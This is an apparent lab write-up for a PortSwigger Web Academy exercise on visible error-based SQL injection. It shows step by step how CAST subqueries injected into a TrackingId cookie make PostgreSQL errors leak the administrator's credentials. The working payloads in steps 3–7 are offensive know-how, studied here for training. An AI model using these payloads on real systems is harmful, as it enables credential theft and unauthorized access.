Lab: Visible error-based SQL injection
Category: SQL Injection (Blind — Error-based)
Platform: PortSwigger Web Academy
URL: portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

Goal: No direct query output, no conditional signal — but verbose SQL errors leak data directly. Extract administrator's password via error messages and log in.

Vulnerability: TrackingId cookie value concatenated into backend query. Errors are returned verbatim in the response, including the raw query. Casting a SELECT subquery result to int (CAST(... AS int)) forces Postgres to try converting text to a number — when it fails, the error message echoes the exact string value that couldn't convert. This becomes a direct data-exfiltration channel via error text.

Steps:

1. Confirmed injection: TrackingId=<val>' → verbose SQL error, query structure exposed.

2. Commented out rest of query: TrackingId=<val>'-- → error gone, valid syntax.

3. Tested CAST-based boolean injection: TrackingId=<val>' AND 1=CAST((SELECT 1) AS int)-- → no error, confirms valid pattern.

4. Attempted to leak username:
TrackingId=<val>' AND 1=CAST((SELECT username FROM users) AS int)--
→ Got truncated-query error — original cookie value + payload exceeded the app's character limit, cutting off the trailing -- comment.

5. Fix: Emptied the TrackingId value entirely to free up characters:
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
→ New error: query ran, but failed because SELECT username FROM users returned multiple rows.

6. Added LIMIT 1:
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
→ Error leaked first username directly: invalid input syntax for type integer: "administrator"

7. Swapped username → password
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
→ Error leaked password: invalid input syntax for type integer: "vhtfooaoom5cu4898b67"

8. Logged in as administrator / vhtfooaoom5cu4898b67 → lab Solved.

Payload: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
Injection point: TrackingId cookie

Takeaway: Error-based SQLi is the fastest blind variant when verbose errors are enabled — data is leaked in a single request instead of character-by-character brute forcing. Key technique: deliberately causing a type-cast failure on a string so the database error message echoes the offending value back. Also a good reminder to watch for application-level character limits on injected fields — truncation can silently break payloads (especially trailing comment markers), and trimming unnecessary characters (like the original cookie value) can fix it.